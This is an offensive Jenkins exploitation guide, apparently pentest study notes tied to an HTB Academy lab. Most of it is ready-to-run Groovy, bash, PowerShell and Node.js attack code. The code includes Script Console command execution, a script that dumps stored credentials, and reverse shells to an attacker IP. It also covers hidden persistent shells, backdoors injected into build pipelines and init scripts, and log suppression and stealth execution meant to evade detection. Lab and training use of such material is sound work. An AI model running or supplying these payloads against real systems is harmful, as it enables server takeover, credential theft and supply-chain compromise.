# ⚔️ Jenkins Attacks & Exploitation

> **🎯 Objective:** Master advanced exploitation techniques for Jenkins CI/CD automation servers, focusing on Script Console abuse, Groovy command execution, pipeline manipulation, and known vulnerability exploitation for achieving remote code execution and development infrastructure compromise.

## Overview

Jenkins exploitation represents one of the **most impactful attack vectors** in enterprise development environments, often providing **immediate SYSTEM/root privileges** and **access to the entire software supply chain**. With Jenkins frequently running with **elevated privileges** for system integration and **direct access to source code, credentials, and deployment systems**, successful exploitation can lead to **complete development infrastructure compromise**.

**Critical Attack Vectors:**
- **Script Console Exploitation** - Groovy-based command execution with SYSTEM privileges
- **Pipeline Manipulation** - Build process injection and malicious code deployment
- **Credential Harvesting** - Access to stored passwords, API keys, and deployment credentials
- **Supply Chain Attacks** - Injection of malicious code into production deployments
- **Agent Compromise** - Lateral movement through Jenkins build slaves

**Enterprise Impact:**
- **Development Infrastructure Control** - Complete access to CI/CD pipeline and build processes
- **Source Code Access** - Repository credentials and sensitive development data
- **Production Deployment Capability** - Direct path to production system compromise
- **Supply Chain Compromise** - Ability to inject malicious code into software products
- **SYSTEM/Root Privileges** - Jenkins often runs with highest system privileges

---

## Script Console Exploitation

### Groovy Command Execution

#### Script Console Access
```bash
# Script Console URL structure
http://jenkins.inlanefreight.local:8000/script

# Authentication verification for Script Console access
curl -b cookies.txt "http://jenkins.inlanefreight.local:8000/script" | \
  grep -q "Script Console" && echo "[+] Script Console accessible"

# Direct access testing (anonymous)
curl -s "http://jenkins.inlanefreight.local:8000/script" | \
  grep -q "Script Console" && echo "[!] CRITICAL: Anonymous Script Console access!"
```

#### Basic Command Execution
```groovy
// Basic command execution via Groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

#### Enhanced Command Execution Script
```groovy
// Enhanced Groovy command execution with error handling
def executeCommand(String command) {
    try {
        def proc = command.execute()
        def stdout = new StringBuffer()
        def stderr = new StringBuffer()
        
        proc.consumeProcessOutput(stdout, stderr)
        proc.waitForOrKill(5000)
        
        println "Command: $command"
        println "Exit Code: ${proc.exitValue()}"
        println "STDOUT:\n$stdout"
        if (stderr.length() > 0) {
            println "STDERR:\n$stderr"
        }
        println "=" * 50
        
        return [exitCode: proc.exitValue(), stdout: stdout.toString(), stderr: stderr.toString()]
        
    } catch (Exception e) {
        println "Error executing command '$command': ${e.getMessage()}"
        return [exitCode: -1, stdout: "", stderr: e.getMessage()]
    }
}

// Usage examples:
executeCommand("whoami")
executeCommand("uname -a")
executeCommand("ps aux | head -10")
executeCommand("netstat -tulpn | grep LISTEN")
```

### Linux System Exploitation

#### Information Gathering Scripts
```groovy
// Comprehensive Linux system reconnaissance
def systemRecon() {
    def commands = [
        "whoami",
        "id",
        "uname -a",
        "cat /etc/os-release",
        "ps aux | grep jenkins",
        "netstat -tulpn | grep LISTEN",
        "cat /proc/version",
        "ls -la /etc/passwd",
        "mount | grep -E '(ext|xfs|btrfs)'",
        "df -h",
        "free -h",
        "env | grep -E '(PATH|HOME|USER|JENKINS)'",
        "cat /etc/crontab",
        "find /opt/jenkins -name '*.xml' | head -10"
    ]
    
    commands.each { cmd ->
        println "\n[+] Executing: $cmd"
        println "=" * 60
        def result = cmd.execute()
        result.waitFor()
        println result.text
    }
}

// Execute system reconnaissance
systemRecon()
```

#### File System Exploration
```groovy
// Jenkins file system exploration and sensitive data discovery
def exploreJenkinsFiles() {
    def jenkinsHome = "/var/lib/jenkins"  // Default Linux path
    
    // Alternative paths to check
    def paths = [
        "/var/lib/jenkins",
        "/var/jenkins_home",
        "/opt/jenkins",
        "/home/jenkins",
        System.getProperty("JENKINS_HOME")
    ]
    
    paths.each { path ->
        if (new File(path).exists()) {
            println "[+] Jenkins home found: $path"
            
            // List important directories
            ["users", "jobs", "secrets", "plugins", "logs"].each { dir ->
                def fullPath = "$path/$dir"
                if (new File(fullPath).exists()) {
                    println "[+] Directory exists: $fullPath"
                    
                    // List contents (limit output)
                    def result = "ls -la $fullPath | head -20".execute()
                    result.waitFor()
                    println result.text
                }
            }
            
            // Look for sensitive files
            ["config.xml", "secrets/master.key", "secrets/hudson.util.Secret"].each { file ->
                def filePath = "$path/$file"
                if (new File(filePath).exists()) {
                    println "[!] Sensitive file found: $filePath"
                }
            }
        }
    }
}

exploreJenkinsFiles()
```

#### Credential and Secret Harvesting
```groovy
// Jenkins credential and secret extraction
def harvestCredentials() {
    try {
        // Access Jenkins credential store
        def credentialsProvider = Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0]
        def credentials = credentialsProvider.getCredentials()
        
        println "[+] Jenkins Credential Store Analysis:"
        println "=" * 50
        
        credentials.each { cred ->
            println "Credential Type: ${cred.class.simpleName}"
            
            // Handle different credential types
            switch(cred.class.simpleName) {
                case 'UsernamePasswordCredentialsImpl':
                    println "  Username: ${cred.username}"
                    println "  Password: ${cred.password}"
                    break
                case 'StringCredentialsImpl':
                    println "  Secret: ${cred.secret}"
                    break
                case 'BasicSSHUserPrivateKey':
                    println "  Username: ${cred.username}"
                    println "  Private Key: [PRIVATE KEY PRESENT]"
                    break
                default:
                    println "  ID: ${cred.id}"
                    println "  Description: ${cred.description}"
            }
            println "  Scope: ${cred.scope}"
            println "-" * 30
        }
        
    } catch (Exception e) {
        println "Error accessing credentials: ${e.getMessage()}"
        
        // Alternative: File system credential search
        println "\n[+] Searching for credential files:"
        def searchCommands = [
            "find /var/lib/jenkins -name '*credential*' -type f",
            "find /var/lib/jenkins -name '*secret*' -type f",
            "find /var/lib/jenkins -name 'config.xml' -exec grep -l 'password\\|secret\\|key' {} \\;",
            "find /var/lib/jenkins/jobs -name 'config.xml' -exec grep -l 'credentialsId' {} \\;"
        ]
        
        searchCommands.each { cmd ->
            println "\nCommand: $cmd"
            def result = cmd.execute()
            result.waitFor()
            println result.text
        }
    }
}

harvestCredentials()
```

### Reverse Shell Establishment

#### Linux Reverse Shell Scripts
```groovy
// Method 1: Bash reverse shell via Groovy
def bashReverseShell(String attackerIP, int port) {
    try {
        println "[+] Establishing reverse shell to $attackerIP:$port"
        
        def cmd = ["/bin/bash", "-c", 
                  "exec 5<>/dev/tcp/$attackerIP/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"]
        
        def proc = new ProcessBuilder(cmd).start()
        proc.waitFor()
        
    } catch (Exception e) {
        println "Reverse shell failed: ${e.getMessage()}"
    }
}

// Method 2: Netcat reverse shell
def netcatReverseShell(String attackerIP, int port) {
    try {
        println "[+] Attempting netcat reverse shell to $attackerIP:$port"
        
        def cmd = "nc -e /bin/bash $attackerIP $port"
        def proc = cmd.execute()
        proc.waitFor()
        
    } catch (Exception e) {
        println "Netcat reverse shell failed, trying alternative methods..."
        
        // Alternative netcat methods
        def altCommands = [
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerIP $port >/tmp/f",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerIP\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "perl -e 'use Socket;\$i=\"$attackerIP\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        ]
        
        altCommands.each { altCmd ->
            try {
                println "[+] Trying: $altCmd"
                altCmd.execute()
                break
            } catch (Exception ex) {
                println "Failed: ${ex.getMessage()}"
            }
        }
    }
}

// Usage (replace with your IP and port):
// bashReverseShell("10.10.14.15", 4444)
// netcatReverseShell("10.10.14.15", 4444)
```

#### Advanced Persistent Shell
```groovy
// Persistent reverse shell with reconnection capability
def persistentReverseShell(String attackerIP, int port, int reconnectInterval = 60) {
    def shellScript = """#!/bin/bash
while true; do
    (bash -i >& /dev/tcp/$attackerIP/$port 0>&1) 2>/dev/null
    sleep $reconnectInterval
done &
"""
    
    try {
        // Write persistent shell script
        def scriptFile = new File("/tmp/.system_update.sh")
        scriptFile.text = shellScript
        
        // Make executable
        "chmod +x /tmp/.system_update.sh".execute().waitFor()
        
        // Execute persistent shell
        "/tmp/.system_update.sh".execute()
        
        println "[+] Persistent reverse shell deployed to $attackerIP:$port"
        println "[+] Reconnection interval: $reconnectInterval seconds"
        println "[+] Script location: /tmp/.system_update.sh"
        
    } catch (Exception e) {
        println "Persistent shell deployment failed: ${e.getMessage()}"
    }
}

// persistentReverseShell("10.10.14.15", 4444, 60)
```

### Windows System Exploitation

#### Windows Command Execution
```groovy
// Windows-specific command execution
def windowsCommand(String command) {
    try {
        def cmd = ["cmd.exe", "/c", command]
        def proc = new ProcessBuilder(cmd).start()
        
        def stdout = proc.inputStream.text
        def stderr = proc.errorStream.text
        
        proc.waitFor()
        
        println "Command: $command"
        println "Exit Code: ${proc.exitValue()}"
        println "Output:\n$stdout"
        if (stderr) {
            println "Errors:\n$stderr"
        }
        println "=" * 50
        
    } catch (Exception e) {
        println "Error executing Windows command: ${e.getMessage()}"
    }
}

// Windows system reconnaissance
def windowsRecon() {
    def commands = [
        "whoami",
        "whoami /all",
        "systeminfo",
        "net user",
        "net localgroup administrators",
        "tasklist | findstr jenkins",
        "netstat -an | findstr LISTENING",
        "wmic os get Caption,Version,BuildNumber",
        "dir C:\\Program Files\\Jenkins",
        "dir C:\\Windows\\System32\\config",
        "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    ]
    
    commands.each { cmd ->
        println "\n[+] Executing: $cmd"
        windowsCommand(cmd)
    }
}

// Execute Windows reconnaissance
windowsRecon()
```

#### Windows Reverse Shell
```groovy
// Java-based reverse shell for Windows
def javaReverseShell(String host, int port) {
    try {
        println "[+] Establishing Java reverse shell to $host:$port"
        
        def socket = new Socket(host, port)
        def process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start()
        
        def inputStream = process.inputStream
        def errorStream = process.errorStream
        def outputStream = process.outputStream
        def socketInputStream = socket.inputStream
        def socketOutputStream = socket.outputStream
        
        // Create threads for I/O handling
        def inputThread = Thread.start {
            try {
                byte[] buffer = new byte[1024]
                int bytesRead
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    socketOutputStream.write(buffer, 0, bytesRead)
                    socketOutputStream.flush()
                }
            } catch (Exception e) {
                println "Input thread error: ${e.getMessage()}"
            }
        }
        
        def outputThread = Thread.start {
            try {
                byte[] buffer = new byte[1024]
                int bytesRead
                while ((bytesRead = socketInputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead)
                    outputStream.flush()
                }
            } catch (Exception e) {
                println "Output thread error: ${e.getMessage()}"
            }
        }
        
        // Keep shell alive
        process.waitFor()
        
    } catch (Exception e) {
        println "Java reverse shell failed: ${e.getMessage()}"
    }
}

// PowerShell-based reverse shell
def powershellReverseShell(String attackerIP, int port) {
    def psCommand = """
\$client = New-Object System.Net.Sockets.TCPClient('$attackerIP',$port);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0) {
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String );
    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
    \$stream.Flush()
};
\$client.Close()
"""
    
    try {
        def cmd = ["powershell.exe", "-Command", psCommand]
        def proc = new ProcessBuilder(cmd).start()
        
        println "[+] PowerShell reverse shell initiated to $attackerIP:$port"
        
    } catch (Exception e) {
        println "PowerShell reverse shell failed: ${e.getMessage()}"
    }
}

// Usage:
// javaReverseShell("10.10.14.15", 4444)
// powershellReverseShell("10.10.14.15", 4444)
```

---

## Build System Exploitation

### Pipeline Manipulation

#### Malicious Pipeline Creation
```groovy
// Create malicious build pipeline via Script Console
def createMaliciousPipeline(String jobName, String attackerIP, int port) {
    try {
        def jenkins = Jenkins.instance
        
        // Pipeline script with reverse shell
        def pipelineScript = """
pipeline {
    agent any
    stages {
        stage('Setup') {
            steps {
                script {
                    def os = System.getProperty('os.name').toLowerCase()
                    
                    if (os.contains('windows')) {
                        bat '''
                        powershell -Command "& {
                            \\$client = New-Object System.Net.Sockets.TCPClient('$attackerIP',$port);
                            \\$stream = \\$client.GetStream();
                            [byte[]]\\$bytes = 0..65535|%{0};
                            while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0) {
                                \\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);
                                \\$sendback = (iex \\$data 2>&1 | Out-String );
                                \\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';
                                \\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);
                                \\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);
                                \\$stream.Flush()
                            };
                            \\$client.Close()
                        }"
                        '''
                    } else {
                        sh '''
                        bash -i >& /dev/tcp/$attackerIP/$port 0>&1
                        '''
                    }
                }
            }
        }
    }
}
"""
        
        // Create pipeline job
        def pipelineJob = new org.jenkinsci.plugins.workflow.job.WorkflowJob(jenkins, jobName)
        def definition = new org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition(pipelineScript, true)
        pipelineJob.setDefinition(definition)
        
        jenkins.add(pipelineJob, jobName)
        jenkins.save()
        
        println "[+] Malicious pipeline '$jobName' created successfully"
        println "[+] Pipeline will establish reverse shell to $attackerIP:$port when executed"
        
        // Optionally trigger the build immediately
        def build = pipelineJob.scheduleBuild(0)
        if (build) {
            println "[+] Build triggered automatically"
        }
        
    } catch (Exception e) {
        println "Pipeline creation failed: ${e.getMessage()}"
    }
}

// Usage:
// createMaliciousPipeline("backdoor-build", "10.10.14.15", 4444)
```

#### Existing Pipeline Modification
```groovy
// Modify existing pipeline to include backdoor
def modifyExistingPipeline(String existingJobName, String attackerIP, int port) {
    try {
        def jenkins = Jenkins.instance
        def job = jenkins.getItem(existingJobName)
        
        if (job && job instanceof org.jenkinsci.plugins.workflow.job.WorkflowJob) {
            def currentDefinition = job.getDefinition()
            def currentScript = currentDefinition.getScript()
            
            // Inject backdoor into existing pipeline
            def backdoorStage = """
        stage('System Maintenance') {
            steps {
                script {
                    try {
                        // Establish reverse shell
                        def shell = '''bash -i >& /dev/tcp/$attackerIP/$port 0>&1'''
                        shell.execute()
                    } catch (Exception e) {
                        // Silently fail to avoid detection
                        println "Maintenance completed"
                    }
                }
            }
        }
"""
            
            // Insert backdoor stage before the last closing brace
            def modifiedScript = currentScript.replaceAll(/(\s*)\}(\s*)$/, "$backdoorStage$1}$2")
            
            // Update pipeline definition
            def newDefinition = new org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition(modifiedScript, true)
            job.setDefinition(newDefinition)
            job.save()
            
            println "[+] Pipeline '$existingJobName' modified with backdoor"
            println "[+] Backdoor will trigger on next build execution"
            
        } else {
            println "[-] Job '$existingJobName' not found or not a pipeline job"
        }
        
    } catch (Exception e) {
        println "Pipeline modification failed: ${e.getMessage()}"
    }
}

// Usage:
// modifyExistingPipeline("existing-project", "10.10.14.15", 4444)
```

### Agent and Slave Exploitation

#### Agent Registration and Control
```groovy
// Enumerate and control Jenkins agents/slaves
def manageJenkinsAgents() {
    try {
        def jenkins = Jenkins.instance
        def computers = jenkins.getComputers()
        
        println "[+] Jenkins Agent/Slave Analysis:"
        println "=" * 50
        
        computers.each { computer ->
            println "Agent Name: ${computer.getName()}"
            println "  Description: ${computer.getDescription()}"
            println "  Online: ${computer.isOnline()}"
            println "  Offline Cause: ${computer.getOfflineCause()}"
            
            if (computer.isOnline()) {
                def channel = computer.getChannel()
                if (channel) {
                    println "  OS: ${channel.call(new hudson.util.RemotingDiagnostics.GetSystemProperty('os.name'))}"
                    println "  Architecture: ${channel.call(new hudson.util.RemotingDiagnostics.GetSystemProperty('os.arch'))}"
                    println "  Java Version: ${channel.call(new hudson.util.RemotingDiagnostics.GetSystemProperty('java.version'))}"
                    println "  Working Directory: ${channel.call(new hudson.util.RemotingDiagnostics.GetSystemProperty('user.dir'))}"
                }
            }
            println "-" * 30
        }
        
        // Attempt to execute commands on agents
        computers.findAll { it.isOnline() && it.getName() != "master" }.each { computer ->
            try {
                def channel = computer.getChannel()
                if (channel) {
                    println "\n[+] Executing command on agent: ${computer.getName()}"
                    
                    def callable = new hudson.util.RemotingDiagnostics.GetSystemProperty('user.name')
                    def result = channel.call(callable)
                    println "  User: $result"
                }
            } catch (Exception e) {
                println "  Command execution failed: ${e.getMessage()}"
            }
        }
        
    } catch (Exception e) {
        println "Agent management failed: ${e.getMessage()}"
    }
}

manageJenkinsAgents()
```

---

## Known Vulnerability Exploitation

### CVE-2018-1999002 & CVE-2019-1003000

#### Pre-Authentication RCE Exploitation
```groovy
// Exploit for Jenkins dynamic routing bypass (CVE-2018-1999002)
// Combined with sandbox bypass (CVE-2019-1003000)
// Note: This affects Jenkins version 2.137 and earlier

def exploitDynamicRouting() {
    try {
        println "[+] Attempting CVE-2018-1999002 / CVE-2019-1003000 exploitation"
        
        // This exploit requires specific conditions and affects older versions
        // Implementation would depend on the specific Jenkins version and configuration
        
        def maliciousGroovy = '''
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec("calc.exe")
})
def x
'''
        
        // The actual exploitation would involve bypassing the sandbox
        // and executing arbitrary code through crafted Groovy scripts
        
        println "[+] Exploit payload prepared"
        println "[!] This exploit works on Jenkins 2.137 and earlier"
        println "[!] Current protection mechanisms may prevent execution"
        
    } catch (Exception e) {
        println "Exploit failed: ${e.getMessage()}"
    }
}

// Note: This is for educational purposes and requires appropriate authorization
// exploitDynamicRouting()
```

### Jenkins 2.150.2 Node.js RCE

#### Job Creation Privilege Abuse
```groovy
// Exploit for Jenkins 2.150.2 Node.js RCE vulnerability
// Requires JOB creation and BUILD privileges

def createNodeJSRCEJob(String jobName, String attackerIP, int port) {
    try {
        def jenkins = Jenkins.instance
        
        // Create a freestyle project with Node.js build step
        def project = new hudson.model.FreeStyleProject(jenkins, jobName)
        
        // Node.js malicious script
        def nodeScript = """
const { exec } = require('child_process');

// Reverse shell payload
const payload = 'bash -i >& /dev/tcp/$attackerIP/$port 0>&1';

exec(payload, (error, stdout, stderr) => {
    if (error) {
        console.error('Error:', error);
        return;
    }
    console.log('Shell established');
});
"""
        
        // Create Node.js build step (requires Node.js plugin)
        def buildStep = new hudson.plugins.nodejs.NodeJSBuildStep(
            "nodejs-default", // Node.js installation name
            nodeScript,
            "node"
        )
        
        project.getBuildersList().add(buildStep)
        jenkins.add(project, jobName)
        jenkins.save()
        
        println "[+] Node.js RCE job '$jobName' created"
        println "[+] Job will execute reverse shell to $attackerIP:$port"
        
        // Trigger build if possible
        def build = project.scheduleBuild(0)
        if (build) {
            println "[+] Build scheduled automatically"
        }
        
    } catch (Exception e) {
        println "Node.js RCE job creation failed: ${e.getMessage()}"
        
        // Alternative: Direct Node.js execution if available
        try {
            def cmd = ["node", "-e", "require('child_process').exec('bash -i >& /dev/tcp/$attackerIP/$port 0>&1')"]
            def proc = new ProcessBuilder(cmd).start()
            println "[+] Direct Node.js execution attempted"
        } catch (Exception ex) {
            println "Direct Node.js execution also failed: ${ex.getMessage()}"
        }
    }
}

// Usage:
// createNodeJSRCEJob("nodejs-backdoor", "10.10.14.15", 4444)
```

---

## HTB Academy Lab Solutions

### Lab 1: Jenkins RCE and Flag Retrieval
**Question:** "Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory"

**Solution Methodology:**

#### Step 1: Environment Setup and Authentication
```bash
# Add VHost entry to /etc/hosts
echo "TARGET_IP jenkins.inlanefreight.local" >> /etc/hosts

# Verify Jenkins accessibility
curl -I http://jenkins.inlanefreight.local:8000/

# Login with provided credentials: admin:admin
curl -c cookies.txt -d "j_username=admin&j_password=admin" \
  http://jenkins.inlanefreight.local:8000/j_security_check

# Verify authentication
curl -b cookies.txt http://jenkins.inlanefreight.local:8000/manage | grep -q "Manage Jenkins"
```

#### Step 2: Script Console Access
```bash
# Access Jenkins Script Console
curl -b cookies.txt http://jenkins.inlanefreight.local:8000/script

# Verify Script Console accessibility
curl -b cookies.txt http://jenkins.inlanefreight.local:8000/script | \
  grep -q "Script Console" && echo "[+] Script Console accessible"
```

#### Step 3: Command Execution via Groovy Script
```groovy
// Basic command execution to verify access
def cmd = 'whoami'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

// Expected output: root (or jenkins user)
```

#### Step 4: Flag Discovery and Retrieval
```groovy
// Method 1: Direct flag reading
def flagPath = '/var/lib/jenkins3/flag.txt'
try {
    def flagFile = new File(flagPath)
    if (flagFile.exists()) {
        println "[+] Flag found at: $flagPath"
        println "[+] Flag content: ${flagFile.text}"
    } else {
        println "[-] Flag not found at $flagPath"
    }
} catch (Exception e) {
    println "Error reading flag: ${e.getMessage()}"
}

// Method 2: Command-based flag reading
def cmd = 'cat /var/lib/jenkins3/flag.txt'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "Flag content: $sout"

// Method 3: Directory exploration if flag location unknown
def exploreCmd = 'find /var/lib/jenkins3 -name "flag.txt" -type f'
def exploreSout = new StringBuffer(), exploreSerr = new StringBuffer()
def exploreProc = exploreCmd.execute()
exploreProc.consumeProcessOutput(exploreSout, exploreSerr)
exploreProc.waitForOrKill(2000)
println "Flag search results: $exploreSout"
```

#### Step 5: Alternative Reverse Shell Method (if needed)
```groovy
// Establish reverse shell for interactive access
def attackerIP = "10.10.14.15"  // Replace with your VPN IP
def port = 4444

// Setup listener first: nc -lvnp 4444

def reverseShell = ["/bin/bash", "-c", 
                   "exec 5<>/dev/tcp/$attackerIP/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"]

try {
    def proc = new ProcessBuilder(reverseShell).start()
    println "[+] Reverse shell initiated to $attackerIP:$port"
} catch (Exception e) {
    println "Reverse shell failed: ${e.getMessage()}"
}
```

#### Step 6: Expected Flag Retrieval
```bash
# From reverse shell or direct Groovy execution:
cat /var/lib/jenkins3/flag.txt

# HTB Academy Expected Output Format:
# Flag content: [FLAG_VALUE]

# HTB Answer: [FLAG_CONTENT] - Replace with actual discovered flag
```

#### Step 7: Verification and Documentation
```groovy
// Comprehensive system information for verification
def verificationCommands = [
    "whoami",
    "id", 
    "pwd",
    "ls -la /var/lib/jenkins3/",
    "cat /var/lib/jenkins3/flag.txt",
    "uname -a",
    "ps aux | grep jenkins"
]

verificationCommands.each { cmd ->
    println "\n[+] Command: $cmd"
    println "=" * 40
    def result = cmd.execute()
    result.waitFor()
    println result.text
}
```

### 🎯 HTB Academy Lab Summary

**Complete Lab Methodology:**
1. **Environment Setup** - VHost configuration and connectivity verification
2. **Authentication** - Login with admin:admin credentials
3. **Script Console Access** - Navigate to /script endpoint
4. **Command Execution** - Use Groovy for system command execution
5. **Flag Discovery** - Read /var/lib/jenkins3/flag.txt
6. **Verification** - Confirm RCE and flag retrieval

**Key Technical Steps:**
- **Groovy Script Execution** - Jenkins Script Console abuse
- **File System Access** - Direct file reading via Groovy/Java
- **Command Execution** - Process creation and output capture
- **Alternative Methods** - Reverse shell for interactive access

---

## Post-Exploitation and Persistence

### Jenkins Backdoor Installation

#### Persistent Script Console Access
```groovy
// Create persistent backdoor in Jenkins configuration
def installPersistentBackdoor() {
    try {
        def jenkins = Jenkins.instance
        def globalConfig = jenkins.getGlobalBuildDiscarder()
        
        // Create scheduled task for persistent access
        def cronExpression = "H/5 * * * *"  // Every 5 minutes
        
        def backdoorScript = '''
def executeBackdoor() {
    try {
        def socket = new Socket("ATTACKER_IP", 4444)
        def inputStream = socket.getInputStream()
        def outputStream = socket.getOutputStream()
        
        def buffer = new byte[1024]
        while (socket.isConnected()) {
            def bytesRead = inputStream.read(buffer)
            if (bytesRead > 0) {
                def command = new String(buffer, 0, bytesRead).trim()
                if (command == "exit") break
                
                def result = command.execute().text
                outputStream.write(result.getBytes())
                outputStream.flush()
            }
        }
        socket.close()
    } catch (Exception e) {
        // Silently fail
    }
}

executeBackdoor()
'''
        
        // Install as system Groovy script
        def initScript = new File(jenkins.getRootDir(), "init.groovy.d/backdoor.groovy")
        initScript.parentFile.mkdirs()
        initScript.text = backdoorScript
        
        println "[+] Persistent backdoor installed in init.groovy.d"
        println "[+] Backdoor will execute on Jenkins restart"
        
    } catch (Exception e) {
        println "Backdoor installation failed: ${e.getMessage()}"
    }
}

// installPersistentBackdoor()
```

#### Supply Chain Attack Preparation
```groovy
// Prepare for supply chain attacks through build modification
def prepareSupplyChainAttack() {
    try {
        def jenkins = Jenkins.instance
        def jobs = jenkins.getAllItems(hudson.model.Job.class)
        
        println "[+] Analyzing jobs for supply chain attack opportunities:"
        
        jobs.each { job ->
            println "\nJob: ${job.getName()}"
            
            // Check for deployment configurations
            if (job.hasProperty('publishers')) {
                job.getPublishers().each { publisher ->
                    println "  Publisher: ${publisher.class.simpleName}"
                    
                    // Look for deployment publishers
                    if (publisher.class.simpleName.contains("Deploy") || 
                        publisher.class.simpleName.contains("Publish")) {
                        println "  [!] Deployment capability detected"
                    }
                }
            }
            
            // Check for artifact archiving
            if (job.hasProperty('builders')) {
                job.getBuilders().each { builder ->
                    println "  Builder: ${builder.class.simpleName}"
                    
                    if (builder.class.simpleName.contains("Archive") ||
                        builder.class.simpleName.contains("Artifact")) {
                        println "  [!] Artifact creation detected"
                    }
                }
            }
        }
        
    } catch (Exception e) {
        println "Supply chain analysis failed: ${e.getMessage()}"
    }
}

// prepareSupplyChainAttack()
```

---

## Defense Evasion and Operational Security

### Log Evasion Techniques

#### Jenkins Audit Log Manipulation
```groovy
// Jenkins log analysis and manipulation
def manipulateJenkinsLogs() {
    try {
        def jenkins = Jenkins.instance
        def loggerName = "hudson.model.Run"
        
        // Reduce logging verbosity for specific actions
        def logger = java.util.logging.Logger.getLogger(loggerName)
        logger.setLevel(java.util.logging.Level.WARNING)
        
        println "[+] Logging verbosity reduced for $loggerName"
        
        // Clear specific log entries if possible
        def logDir = new File(jenkins.getRootDir(), "logs")
        if (logDir.exists()) {
            println "[+] Jenkins log directory: ${logDir.absolutePath}"
            
            logDir.listFiles().each { logFile ->
                if (logFile.name.contains("audit") || logFile.name.contains("access")) {
                    println "  Log file: ${logFile.name} (${logFile.length()} bytes)"
                }
            }
        }
        
    } catch (Exception e) {
        println "Log manipulation failed: ${e.getMessage()}"
    }
}

// manipulateJenkinsLogs()
```

### Anti-Detection Measures
```groovy
// Stealth command execution with minimal footprint
def stealthExecution(String command) {
    try {
        // Execute command without creating obvious process traces
        def tempScript = File.createTempFile("sys", ".sh")
        tempScript.text = "#!/bin/bash\n$command\nrm -f ${tempScript.absolutePath}"
        tempScript.setExecutable(true)
        
        def proc = tempScript.absolutePath.execute()
        def result = proc.text
        proc.waitFor()
        
        // Clean up
        if (tempScript.exists()) {
            tempScript.delete()
        }
        
        return result
        
    } catch (Exception e) {
        return "Error: ${e.getMessage()}"
    }
}

// Usage:
// def result = stealthExecution("cat /var/lib/jenkins3/flag.txt")
// println result
```

---

## Professional Assessment Integration

### Jenkins Security Assessment Workflow

#### Discovery Phase
- [ ] **Service Identification** - Port scanning and Jenkins fingerprinting
- [ ] **Version Detection** - API endpoints and interface analysis
- [ ] **Authentication Testing** - Default credentials and anonymous access
- [ ] **Plugin Enumeration** - Security plugins and extension analysis

#### Exploitation Phase
- [ ] **Script Console Access** - Groovy command execution capability
- [ ] **Pipeline Manipulation** - Build process injection and modification
- [ ] **Credential Harvesting** - Stored secrets and API key extraction
- [ ] **Agent Compromise** - Build slave exploitation and lateral movement

#### Post-Exploitation Phase
- [ ] **Persistence Establishment** - Backdoor installation and maintenance
- [ ] **Supply Chain Preparation** - Production deployment access
- [ ] **Lateral Movement** - Network traversal through Jenkins connectivity
- [ ] **Data Exfiltration** - Source code and credential extraction

---

## Next Steps

After Jenkins exploitation mastery:
1. **[GitLab Discovery & Attacks](gitlab-discovery-attacks.md)** - Source code management exploitation
2. **[CI/CD Pipeline Security](cicd-pipeline-security.md)** - Advanced build system attacks
3. **[Splunk Discovery & Attacks](splunk-discovery-attacks.md)** - Infrastructure monitoring exploitation

**💡 Key Takeaway:** Jenkins exploitation provides **immediate high-privilege access** to **development infrastructure** with **SYSTEM/root execution context**. Master **Script Console abuse**, **Groovy command execution**, and **pipeline manipulation** for **reliable CI/CD compromise** and **supply chain attack capabilities**.

**⚔️ Professional Impact:** Jenkins compromises often lead to **complete development infrastructure control**, **source code access**, **production deployment capabilities**, and **supply chain attack opportunities**, making these skills **critical for advanced penetration testing** in **enterprise environments**. 